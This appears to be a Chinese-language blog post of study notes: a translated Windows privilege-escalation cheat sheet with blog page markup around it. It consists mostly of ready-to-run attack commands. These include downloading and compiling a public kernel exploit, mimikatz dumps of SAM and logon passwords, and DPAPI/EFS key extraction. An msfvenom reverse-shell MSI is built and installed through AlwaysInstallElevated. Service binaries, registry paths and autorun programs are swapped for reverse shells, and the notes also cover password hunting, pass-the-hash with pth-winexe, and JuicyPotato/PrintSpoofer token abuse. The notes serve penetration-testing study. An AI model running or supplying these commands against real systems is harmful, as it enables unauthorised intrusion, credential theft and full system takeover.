+<h4 id="Microsoft-Windows-本地权限升级-MS15-051"><a href="#Microsoft-Windows-本地权限升级-MS15-051" class="headerlink" title="Microsoft Windows - 本地权限升级 (MS15-051)"></a>Microsoft Windows - 本地权限升级 (MS15-051)</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">wget</span> https://github.com/SecWiki/windows<span class="hljs-literal">-kernel-exploits</span>/raw/master/MS15<span class="hljs-literal">-051</span>/MS15<span class="hljs-literal">-051-KB3045171</span>.zip<br></code></pre></td></tr></table></figure>
+
+<h4 id="USBPcap空指针取消引用权限升级-CVE-2017-6178"><a href="#USBPcap空指针取消引用权限升级-CVE-2017-6178" class="headerlink" title="USBPcap空指针取消引用权限升级 (CVE-2017-6178)"></a><code>USBPcap</code>空指针取消引用权限升级 (CVE-2017-6178)</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| Information</span><br><span class="hljs-comment"># Date             - 07th March 2017</span><br><span class="hljs-comment"># Discovered by    - Parvez Anwar (@parvezghh)</span><br><span class="hljs-comment"># Vendor Homepage  - http://desowin.org/usbpcap/ </span><br><span class="hljs-comment"># Tested Version   - 1.1.0.0  (USB Packet capture for Windows bundled with WireShark 2.2.5)</span><br><span class="hljs-comment"># Driver Version   - 1.1.0.0 - USBPcap.sys</span><br><span class="hljs-comment"># Tested on OS     - 32bit Windows 7 SP1 </span><br><span class="hljs-comment"># Vendor fix url   - not yet</span><br><span class="hljs-comment"># Fixed Version    - 0day</span><br><span class="hljs-comment"># Fixed driver ver - 0day</span><br><br><span class="hljs-comment">## ------------------| Check Vulnarable Version   </span><br>driverquery /v | findstr USBPcap.sys<br><span class="hljs-built_in">type</span> <span class="hljs-string">&quot;C:\Program Files\USBPcap\USBPcap.inf&quot;</span><br><br><span class="hljs-comment">## ------------------| Exploit</span><br><span class="hljs-built_in">curl</span> <span class="hljs-literal">-o</span> exploit.c https://www.exploit<span class="hljs-literal">-db</span>.com/raw/<span class="hljs-number">41542</span><br>gcc.exe <span class="hljs-literal">-c</span> exploit.exe exploit.c<br>./exploit.exe<br></code></pre></td></tr></table></figure>
+
+<h2 id="04-mimikatz"><a href="#04-mimikatz" class="headerlink" title="04.mimikatz"></a>04.<a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20210810-2">mimikatz</a></h2><ul>
+<li><p>更多命令可以在<a target="_blank" rel="noopener" href="https://docs.h4rithd.com/windows/smb-ad-enumeration#18.-mimikatz">这里使用！</a></p>
+</li>
+<li><p><code>ntlm</code>使用转储所有用户的哈希值<code>lsass</code></p>
+</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell">.\mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;token::elevate&quot;</span> <span class="hljs-string">&quot;lsadump::sam&quot;</span> <span class="hljs-string">&quot;exit&quot;</span> &gt;&gt; mimikatz<span class="hljs-literal">-sam</span>.out <br>.\mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonpasswords&quot;</span> <span class="hljs-string">&quot;exit&quot;</span> &gt;&gt; mimikatz<span class="hljs-literal">-logonpasswords</span>.out       <br><br><span class="hljs-comment">## ------------------| 如果你有lsass作为迷你DuMP或Rekall</span><br>pip3 install pypykatz<br>pypykatz lsa minidump lsass.DMP <span class="hljs-literal">--json</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>设置账户密码</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">.\mimikatz.exe <span class="hljs-string">&quot;lsadump::setntlm /user:USERNAME /ntlm:NTLMHASH&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>解密 EFS 文件。 [<a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files">来源</a>]</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| 获取文件的证书指纹值</span><br>cipher /c c:\users\file.txt | <span class="hljs-built_in">Select-String</span> <span class="hljs-string">&quot;Certificate thumbprint&quot;</span><br><span class="hljs-comment">## 您也可以使用以下命令获得此信息。</span><br><span class="hljs-built_in">dir</span> C:\Users\&lt;UserName&gt;\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates\ | <span class="hljs-built_in">Select</span> Name  <br><br><span class="hljs-comment">## ------------------| 正在获取证书</span><br>.\mimikatz.exe <span class="hljs-string">&quot;crypto::system /file:C:\Users\&lt;UserName&gt;\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates\&lt;Certificate_Thumbprint&gt; /export&quot;</span> <span class="hljs-string">&quot;exit&quot;</span>    <br><span class="hljs-comment">## 将*.der文件下载到您的计算机上。</span><br><br><span class="hljs-comment">## ------------------| 获取万能钥匙</span><br><span class="hljs-built_in">gci</span> C:\Users\tolu\AppData\Roaming\Microsoft\protect\<br><span class="hljs-built_in">gci</span> <span class="hljs-literal">-hidden</span> C:\Users\tolu\AppData\Roaming\Microsoft\protect\&lt;SID_VALUE&gt;\<br>.\mimikatz.exe <span class="hljs-string">&quot;dpapi::masterkey /in:C:\Users\&lt;UserName&gt;\AppData\Roaming\Microsoft\protect\&lt;SID_VALUE&gt;\&lt;FileName&gt; /password:&lt;UserPassword&gt;&quot;</span> <span class="hljs-string">&quot;exit&quot;</span>     <br><br><span class="hljs-comment">## ------------------| 解密私钥</span><br><span class="hljs-built_in">gci</span> C:\Users\&lt;UserName&gt;\AppData\Roaming\Microsoft\Crypto\RSA\<br><span class="hljs-built_in">gci</span> C:\Users\&lt;UserName&gt;\AppData\Roaming\Microsoft\Crypto\RSA\&lt;SID_VALUE&gt;\<br>.\mimikatz.exe <span class="hljs-string">&quot;dpapi::capi /in:C:\Users\&lt;UserName&gt;\AppData\Roaming\Microsoft\Crypto\RSA\&lt;SID_VALUE\&lt;FILE&gt; /masterkey:&lt;SHA-1&gt;&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br><span class="hljs-comment">## 将*.pvk文件下载到您的计算机上。</span><br><br><span class="hljs-comment">## ------------------| 构建和安装正确的PFX</span><br>openssl x509 <span class="hljs-literal">-inform</span> DER <span class="hljs-literal">-outform</span> PEM <span class="hljs-operator">-in</span> *.der <span class="hljs-literal">-out</span> public.pem<br>openssl rsa <span class="hljs-literal">-inform</span> PVK <span class="hljs-literal">-outform</span> PEM <span class="hljs-operator">-in</span> *.pvk <span class="hljs-literal">-out</span> private.pem<br>openssl pkcs12 <span class="hljs-operator">-in</span> public.pem <span class="hljs-literal">-inkey</span> private.pem <span class="hljs-literal">-password</span> pass:&lt;NewPassword&gt; <span class="hljs-literal">-keyex</span> <span class="hljs-literal">-CSP</span> <span class="hljs-string">&quot;Microsoft Enhanced Cryptographic Provider v1.0&quot;</span> <span class="hljs-literal">-export</span> <span class="hljs-literal">-out</span> cert.pfx       <br><span class="hljs-comment">## 将cert.pfx文件复制到远程计算机。</span><br>certutil <span class="hljs-literal">-user</span> <span class="hljs-literal">-p</span> &lt;NewPassword&gt; <span class="hljs-literal">-importpfx</span> cert.pfx NoChain,NoRoot<br><br><span class="hljs-comment">## ------------------| Data access</span><br><span class="hljs-built_in">type</span> <span class="hljs-string">&quot;c:\users\file.txt&quot;</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="05-检查提醒清单"><a href="#05-检查提醒清单" class="headerlink" title="05.检查提醒清单"></a>05.检查提醒清单</h2><h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/Kargha/CyberSec-Notes/blob/main/PrivEsc%20-%20Windows.md#checklist">清单</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/Kargha/CyberSec-Notes/blob/main/PrivEsc%20-%20Windows.md#enumeration-tools">枚举工具</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/Kargha/CyberSec-Notes/blob/main/PrivEsc%20-%20Windows.md#kernel-exploits">内核漏洞</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/Kargha/CyberSec-Notes/blob/main/PrivEsc%20-%20Windows.md#service-exploits">服务漏洞</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/Kargha/CyberSec-Notes/blob/main/PrivEsc%20-%20Windows.md#registry">登记处</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/Kargha/CyberSec-Notes/blob/main/PrivEsc%20-%20Windows.md#passwords">密码</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/Kargha/CyberSec-Notes/blob/main/PrivEsc%20-%20Windows.md#scheduled-tasks">计划任务</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/Kargha/CyberSec-Notes/blob/main/PrivEsc%20-%20Windows.md#insecure-gui-applications">不安全的 GUI 应用程序</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/Kargha/CyberSec-Notes/blob/main/PrivEsc%20-%20Windows.md#token-impersonation">令牌模拟</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/Kargha/CyberSec-Notes/blob/main/PrivEsc%20-%20Windows.md#software-vulnerabilities">软件漏洞</a></li>
+</ul>
+<hr>
+<h3 id="清单"><a href="#清单" class="headerlink" title="清单"></a>清单</h3><ul>
+<li><input disabled="" type="checkbox"> whoami &#x2F;priv（SeImpersonatePrivileges 或 SeAssignPrimaryToken &#x3D;&#x3D; WIN）</li>
+<li><input disabled="" type="checkbox"> 系统信息</li>
+<li><input disabled="" type="checkbox"> winPEAS</li>
+<li><input disabled="" type="checkbox"> 其他</li>
+</ul>
+<hr>
+<h3 id="枚举工具"><a href="#枚举工具" class="headerlink" title="枚举工具"></a>枚举工具</h3><p>对于枚举，首先使用WinPEAS。尽量避免考试时 PowerUp！但如果使用，请确保不要使用任何自动利用脚本！</p>
+<h4 id="powerup"><a href="#powerup" class="headerlink" title="powerup"></a>powerup</h4><p>首先加载脚本：<code>Import-Module ./PowerUp.ps1</code></p>
+<p>然后运行所有检查：<code>Invoke-AllChecks</code></p>
+<h4 id="SharpUp"><a href="#SharpUp" class="headerlink" title="SharpUp"></a>SharpUp</h4><p><code>.\SharpUp.exe</code></p>
+<h4 id="Seatbelt"><a href="#Seatbelt" class="headerlink" title="Seatbelt"></a>Seatbelt</h4><p>来源：<a target="_blank" rel="noopener" href="https://github.com/GhostPack/Seatbelt">https://github.com/GhostPack/Seatbelt</a> 预编译：<a target="_blank" rel="noopener" href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Seatbelt.exe">https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Seatbelt.exe</a></p>
+<p>运行所有检查：<code>.\Seatbelt.exe all</code> 或单独检查：<code>.\Seatbelt.exe &lt;check&gt; &lt;check&gt; &lt;...&gt;</code></p>
+<h4 id="winPEAS"><a href="#winPEAS" class="headerlink" title="winPEAS"></a>winPEAS</h4><p>第一次运行<code>reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1</code></p>
+<p>所有（快速）检查：<code>.\winPEASany.exe quiet cmd fast</code> 具体类别：<code>.\winPEASany.exe quiet cmd systeminfo</code></p>
+<h4 id="访问检查"><a href="#访问检查" class="headerlink" title="访问检查"></a>访问检查</h4><p>即将推出…</p>
+<hr>
+<h3 id="内核漏洞"><a href="#内核漏洞" class="headerlink" title="内核漏洞"></a>内核漏洞</h3><h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><p>WES（Windows 漏洞利用建议器）：<a target="_blank" rel="noopener" href="https://github.com/bitsadmin/wesng">https://github.com/bitsadmin/wesng</a> 预编译漏洞：<a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a> Watson：<a target="_blank" rel="noopener" href="https://github.com/rasta-mouse/Watson">https://github.com/rasta-鼠标/沃森</a></p>
+<h4 id="权限提升示例（Win7）"><a href="#权限提升示例（Win7）" class="headerlink" title="权限提升示例（Win7）"></a>权限提升示例（Win7）</h4><ol>
+<li>在 Windows 机器上，运行：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs batchfile">systeminfo &gt; \\my.kali.ip.here\SHARE\systeminfo.txt<br></code></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>然后在 Kali 上，您可以在 systeminfo.txt 上运行 wesng</li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python wes.py systeminfo.txt -i &#x27;Elevation of Privilege&#x27; --exploits-only | less<br></code></pre></td></tr></table></figure>
+
+<ol start="3">
+<li><p>与 SecWiki 上已编译的漏洞交叉引用结果</p>
+</li>
+<li><p>从 msfvenom 运行反向 shell 有效负载作为已编译漏洞的参数。</p>
+</li>
+</ol>
+<hr>
+<h3 id="服务漏洞"><a href="#服务漏洞" class="headerlink" title="服务漏洞"></a>服务漏洞</h3><h4 id="服务命令"><a href="#服务命令" class="headerlink" title="服务命令"></a>服务命令</h4><p>查询服务：<code>sc.exe qc &lt;name&gt;</code> 查询服务的状态：<code>sc.exe query &lt;name&gt;</code> 修改服务的配置选项：<code>sc.exe config &lt;name&gt; &lt;option&gt;=&lt;value&gt;</code> 启动&#x2F;停止服务：<code>net start/stop &lt;name&gt;</code></p>
+<h4 id="可能的配置错误"><a href="#可能的配置错误" class="headerlink" title="可能的配置错误"></a>可能的配置错误</h4><ul>
+<li>不安全的服务属性</li>
+<li>不带引号的服务路径</li>
+<li>注册表权限较弱</li>
+<li>不安全的服务可执行文件</li>
+<li>DLL劫持</li>
+</ul>
+<h4 id="不安全的服务属性-权限"><a href="#不安全的服务属性-权限" class="headerlink" title="不安全的服务属性&#x2F;权限"></a>不安全的服务属性&#x2F;权限</h4><p>危险权限：<code>SERVICE_CHANGE_CONFIG, SERVICE_ALL_ACCESS</code> 有用权限：<code>SERVICE_STOP, SERVICE_START</code></p>
+<p><em>注意：如果您可以更改服务配置，但无法停止&#x2F;启动服务，则您可能无法使用 PrivEsc！</em></p>
+<h5 id="PrivEsc-示例"><a href="#PrivEsc-示例" class="headerlink" title="PrivEsc 示例"></a>PrivEsc 示例</h5><ol>
+<li>使用 winPEAS 检查：<code>.\winPEASany.exe quiet servicesinfo</code></li>
+<li>使用 AccessChk 确认结果：<code>.\accesschk.exe /accepteula -uwcqv user &lt;name&gt;</code></li>
+<li>检查配置：<code>sc qc &lt;name&gt;</code></li>
+<li>检查状态：<code>sc query &lt;name&gt;</code></li>
+<li>重新配置路径：<code>sc config &lt;name&gt; binpath=&quot;\&quot;C:\PrivEsc\reverse.exe&quot;\&quot;</code></li>
+<li>启动监听器</li>
+<li>启动&#x2F;重新启动服务：<code>net start &lt;name&gt;</code></li>
+</ol>
+<h4 id="不带引号的服务路径"><a href="#不带引号的服务路径" class="headerlink" title="不带引号的服务路径"></a>不带引号的服务路径</h4><p>不带引号的路径（例如）：<code>C:\Program Files\Some Dir\SomeProgram.exe</code> 可能的路径：</p>
+<ul>
+<li><code>C:\Program.exe</code></li>
+<li><code>C:\Program Files\Some.exe</code></li>
+</ul>
+<p>检查所有潜在的写入权限：</p>
+<ul>
+<li><code>.\accesschk.exe /accepteula -uwdq C:\</code></li>
+<li><code>.\accesschk.exe /accepteula -uwdq &quot;C:\Program Files\&quot;</code></li>
+<li><code>.\accesschk.exe /accepteula -uwdq &quot;C:\Program Files\Some Dir\&quot;</code></li>
+</ul>
+<p>将 rev shell 复制到可写目录。然后<code>net start &lt;name&gt;</code></p>
+<h4 id="弱注册表权限"><a href="#弱注册表权限" class="headerlink" title="弱注册表权限"></a>弱注册表权限</h4><p>需要：SERVICE_START</p>
+<p>可以允许您将服务间接修改为 PrivEsc</p>
+<ol>
+<li>检查服务配置是否错误：<code>.\winPEASany.exe quiet servicesinfo</code></li>
+<li>使用以下方法之一确认配置错误：<ol>
+<li><code>PS&gt; Get-Acl HKLM:\System\CurrentControlSet\Services\&lt;name&gt; | Format-List</code></li>
+<li><code>.\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\&lt;name&gt;</code></li>
+</ol>
+</li>
+<li>覆盖注册表键值以指向我们自己的 rev shell：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs batchfile">reg add HKLM\SYSTEM\CurrentControlSet\services\&lt;name&gt; /v ImagePath /t REG_EXPAND_SZ /d C:\path /f<br></code></pre></td></tr></table></figure>
+
+<ol start="5">
+<li>启动服务：<code>net start &lt;name&gt;</code></li>
+</ol>
+<h4 id="不安全的服务可执行文件"><a href="#不安全的服务可执行文件" class="headerlink" title="不安全的服务可执行文件"></a>不安全的服务可执行文件</h4><p>需要：SERVICE_START</p>
+<p>如果我们有写入权限，请交换服务可执行文件。</p>
+<ol>
+<li>检查漏洞：<code>.\winPEASany.exe quiet servicesinfo</code></li>
+<li>使用 accesschk 验证：<code>.\accesschk.exe /accepteula -quvw &quot;C:\Program Files\Service Path\service.exe&quot;</code></li>
+<li>备份服务exe：<code>copy &quot;C:\Program Files\Service Path\service.exe&quot; C:\Temp</code></li>
+<li>用我们的 revshell 覆盖：<code>copy /Y C:\PrivEsc\reverse.exe &quot;C:\Program Files\Service Path\service.exe&quot;</code></li>
+<li>在 Kali 上启动监听器</li>
+<li>启动服务：<code>net start &lt;name&gt;</code></li>
+</ol>
+<h4 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h4><p>需要：SERVICE_START&#x2F;STOP</p>
+<p>（可能需要管理员权限，请查看 PDF 以了解如何执行的详细信息）</p>
+<hr>
+<h3 id="registry"><a href="#registry" class="headerlink" title="registry"></a>registry</h3><h4 id="自动运行"><a href="#自动运行" class="headerlink" title="自动运行"></a>自动运行</h4><p>注意：这只能以 Win 10 中最后登录用户的权限运行！所以你首先需要管理员信用（使其不太可靠）</p>
+<ol>
+<li>检查可写的 AutoRun exe<ol>
+<li><code>.\winPEASany.exe quiet applicationsinfo</code></li>
+<li>或者手动：<ol>
+<li><code>reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code></li>
+<li>使用 accesschk 验证每个条目： <code>.\accesschk.exe /accepteula -wvu &quot;C:\Program Files\&lt;path to program&gt;\program.exe&quot;</code></li>
+</ol>
+</li>
+</ol>
+</li>
+<li>如果可写，则创建备份：<code>copy &quot;C:\Program Files\&lt;path to program&gt;\program.exe&quot; C:\temp</code></li>
+<li>复制revshell exe：<code>copy /Y C:\temp\revshell.exe &quot;C:\Program Files\&lt;path to program&gt;\program.exe&quot;</code></li>
+<li>启动 revshell 侦听器并重新启动盒子</li>
+</ol>
+<h4 id="始终安装提升"><a href="#始终安装提升" class="headerlink" title="始终安装提升"></a>始终安装提升</h4><p>需要：AlwaysInstallElevated 注册表项</p>
+<ol>
+<li>验证所需条目均设置为 1<ol>
+<li>使用 winPEAS：<code>.\winPEASany.exe quiet windowscreds</code></li>
+<li>手动：<ol>
+<li><code>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</code></li>
+<li><code>reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</code></li>
+</ol>
+</li>
+</ol>
+</li>
+<li>创建一个 msfvenom revshell：<code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=443 -f msi -o revshell.msi</code></li>
+<li>将msi文件复制到目标并启动监听器</li>
+<li>启动安装程序：<code>msiexec /quiet /qn /i C:\temp\revshell.msi</code></li>
+</ol>
+<hr>
+<h3 id="密码"><a href="#密码" class="headerlink" title="密码"></a>密码</h3><h4 id="注册表搜索"><a href="#注册表搜索" class="headerlink" title="注册表搜索"></a>注册表搜索</h4><p>慢速方式（扫描整个注册表）：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">&gt; reg query HKLM /f password /t REG_SZ /s<br>&gt; reg query HKCU /f password /t REG_SZ /s<br></code></pre></td></tr></table></figure>
+
+<p>更快的方法：</p>
+<ol>
+<li>使用 winpeas 检查常见位置：<code>.\winPEASany.exe quiet filesinfo userinfo</code></li>
+<li>使用注册表查询进行验证</li>
+<li>如果验证通过，我们可以使用 winexe 生成 shell：<code>winexe -U &#39;user%password&#39; //the.targets.ip.here cmd.exe</code></li>
+</ol>
+<h3 id="保存的凭证"><a href="#保存的凭证" class="headerlink" title="保存的凭证"></a>保存的凭证</h3><ol>
+<li>使用 winPEAS 检查已保存的信用：<code>.\winPEASany.exe quiet cmd windowscreds</code></li>
+<li>验证：<code>cmdkey /list</code></li>
+<li>然后我们可以使用保存的凭据以用户身份运行任何命令：<code>runas /savecred /user:admin C:\temp\revshell.exe</code></li>
+</ol>
+<h4 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h4><p>注意：Unattend.xml 可能是一个有用的文件！</p>
+<p>搜索配置文件（包含单词 pass 或以 .config 结尾）：<code>dir /s *pass* == *.config</code></p>
+<p>搜索包含密码一词的文件：<code>findstr /si password *.xml *.ini *.txt</code></p>
+<p>您还可以使用 winPEAS 查找类似的文件：<code>.\winPEASany.exe quiet cmd searchfast filesinfo</code></p>
+<p>任何像这样找到的凭据都可能被 winexe 滥用：<code>winexe -U &#39;user%password&#39; //the.targets.ip.here cmd.exe</code></p>
+<h4 id="SAM"><a href="#SAM" class="headerlink" title="SAM"></a>SAM</h4><p>SAM 和 SYSTEM 文件转储。检查<code>C:\Windows\Repair</code>或中是否有篮子<code>C:\Windows\System32\config\RegBack</code></p>
+<p>使用 creddump、pwdump 或 samdump 转储密码哈希值。使用 john 或 hashcat 进行破解。</p>
+<h4 id="传递哈希值"><a href="#传递哈希值" class="headerlink" title="传递哈希值"></a>传递哈希值</h4><p>您可以使用 pth-winexe 传递哈希值，而不是破解转储的哈希值：</p>
+<p><code>pth-winexe -U &#39;admin%HASH_HERE&#39; //the.targets.ip.here cmd.exe</code></p>
+<p>您还可以添加<code>--system</code>管理哈希来生成 SYSTEM shell。</p>
+<hr>
+<h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><p>要列出所有计划任务，您可以看到：<code>schtasks /query /fo LIST /v</code> Powershell：<code>Get-ScheduledTask| where &#123;$_.TaskPath-notlike&quot;\Microsoft*&quot;&#125; | ft TaskName,TaskPath,State</code></p>
+<ol>
+<li>如果您发现具有适当权限的任务，请使用 accesschk 进行验证：<code>.\accesschk.exe /accepteula -quvw user C:\Program Files\&lt;path to program\program.exe</code></li>
+<li>如果您可以写入它，则可以将其替换为 revshell，或者如果它是脚本，则将我们的 revshell 的路径附加到它。</li>
+</ol>
+<hr>
+<h3 id="不安全的-GUI-应用程序"><a href="#不安全的-GUI-应用程序" class="headerlink" title="不安全的 GUI 应用程序"></a>不安全的 GUI 应用程序</h3><p>需要：启用“以管理员身份运行”的程序。</p>
+<p>在程序中：文件-&gt;打开-&gt;<code>file://c:/windows/system32/cmd.exe</code></p>
+<p>这应该打开以管理员身份运行的 cmd.exe。</p>
+<hr>
+<h3 id="令牌模拟"><a href="#令牌模拟" class="headerlink" title="令牌模拟"></a>令牌模拟</h3><p>所有这些都需要：<code>SeImpersonatePrivilege</code>或<code>SeAssignPrimaryToken</code></p>
+<p>如果您需要本地服务帐户（可能），您可以使用 PSExec64.exe 以管理员身份生成一个帐户：<code>.\PSExec64.exe -i -u &quot;nt authority\local service&quot; C:\temp\revshell.exe</code></p>
+<h3 id="多汁土豆"><a href="#多汁土豆" class="headerlink" title="多汁土豆"></a>多汁土豆</h3><p>跑步： <code>.\JuicyPotato.exe -l 1337 -p C:\temp\reverse.exe -t * -c &#123;CLSID&#125;</code></p>
+<p>在这里查找 CLSID：<a target="_blank" rel="noopener" href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md">https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md</a></p>
+<h4 id="流氓土豆"><a href="#流氓土豆" class="headerlink" title="流氓土豆"></a>流氓土豆</h4><h4 id="打印欺骗者"><a href="#打印欺骗者" class="headerlink" title="打印欺骗者"></a>打印欺骗者</h4><p>跑步：<code>.\PrintSpoofer.exe -i -c &quot;C:\temp\revshell.exe&quot;</code></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="category-chain-item">学习笔记</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Offensive-security/" class="print-no-link">#Offensive security</a>
+      
+        <a href="/tags/Windows-privilege-escalation/" class="print-no-link">#Windows privilege escalation</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Windows特权提升-h4rithd-2024.04.03版本</div>
+      <div>https://sh1yan.top/2024/06/02/Windows-privilege-escalation-h4rithd-20240403/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>shiyan</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年6月2日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/06/02/Windows-Common-Command-Horizontal-Move-h4rithd-20240403/" title="Windows常用命令-横向移动-h4rithd-2024.04.03版本">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Windows常用命令-横向移动-h4rithd-2024.04.03版本</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/06/02/Windows-Command-Notes-Collection-hacktoday-net-20201201/" title="Windows 命令备忘笔记集合-hacktoday.net-2020.12.01版本">
+                        <span class="hidden-mobile">Windows 命令备忘笔记集合-hacktoday.net-2020.12.01版本</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
